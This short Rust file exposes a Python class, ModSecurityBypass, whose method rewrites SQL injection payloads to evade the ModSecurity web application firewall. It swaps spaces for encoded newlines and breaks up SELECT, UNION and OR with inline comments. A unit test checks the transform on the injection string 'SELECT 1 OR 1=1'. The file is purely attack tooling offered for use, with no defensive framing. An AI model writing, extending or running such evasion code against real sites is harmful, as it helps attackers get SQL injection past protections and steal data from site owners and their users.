use pyo3::prelude::*;

#[pyclass(skip_from_py_object)]
pub struct ModSecurityBypass;

#[pymethods]
impl ModSecurityBypass {
    #[new]
    fn new() -> Self {
        Self
    }

    fn apply(&self, payload: String) -> PyResult<String> {
        let replaced = payload
            .replace(" ", "%0a")
            .replace("SELECT", "SE/**/LECT")
            .replace("UNION", "UN/**/ION")
            .replace("OR", "O/**/R");
        Ok(replaced)
    }
}

#[cfg(test)]
mod tests {
    use super::ModSecurityBypass;

    #[test]
    fn applies_bypass() {
        let bypass = ModSecurityBypass;
        let out = bypass.apply("SELECT 1 OR 1=1".to_string()).unwrap();
        assert!(out.contains("SE/**/LECT"));
    }
}
